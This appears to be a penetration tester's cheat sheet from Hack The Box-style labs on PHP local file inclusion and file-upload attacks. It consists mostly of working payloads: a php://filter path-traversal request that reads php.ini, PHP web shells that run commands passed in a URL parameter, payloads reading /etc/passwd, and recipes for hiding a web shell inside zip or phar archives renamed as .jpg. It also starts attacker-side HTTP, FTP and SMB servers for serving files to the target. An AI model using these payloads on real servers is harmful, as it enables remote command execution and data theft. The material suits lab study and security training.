# Useful Links

# Useful Commands

HTTP Server
```bash
sudo python3 -m http.server <LISTENING_PORT>
```

FTP Server
```bash
sudo python3 -m pyftpdlib -p 21
```
SMB Server
```bash
impacket-smbserver -smb2support share $(pwd)
```
Checking PHP Configurations
```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

Base64 PHP Shell
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

# Useful Payloads
```php
<?php file_get_contents('/etc/passwd'); ?>
<?php system('cat /flag.txt'); ?>
<?php system($_REQUEST['cmd']); ?>
```
```
[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
### Phar Upload
Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:
```
Code: php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
```
[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
